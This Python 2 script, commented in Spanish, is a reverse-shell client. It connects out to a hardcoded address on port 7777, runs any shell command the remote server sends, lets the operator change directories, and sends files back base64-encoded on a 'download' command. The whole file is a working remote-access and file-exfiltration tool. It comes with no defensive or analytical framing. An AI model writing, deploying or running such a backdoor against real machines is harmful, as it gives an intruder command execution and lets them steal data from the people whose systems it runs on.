#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import subprocess
import base64

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
      res = cliente.recv(1024)
      if res == "exit":
         break
      # Comprueba lo que hay después del cd, sigue ejecutando cmd y ejecuta el comando al cliente que se ha mandado desde el servidor
      elif res[:2] == "cd" and len(res) > 2:
         os.chdir(res[3:])
         result = os.getcwd()
         cliente.send(result)
      # Lee el documento que hayamos seleccionado
      elif res[:8] == "download":
         with open(res[9:], 'rb') as file_download:
            cliente.send(base64.b64encode(file_download.read()))
      else:
         # Muestra por la consola del cliente el resultado de un comando o un error si el comando no existe, hay que hacerlo ya que la shell se quedaría colgada
         proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         result = proc.stdout.read() + proc.stderr.read()
         # En comandos como mkdir que no muestra un resultado, manda un 1 al servidor y así poder ejecutandose
         if len(result) == 0:
            cliente.send("1")
         else:
            cliente.send(result)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("192.168.1.110", 7777))
shell()
cliente.close()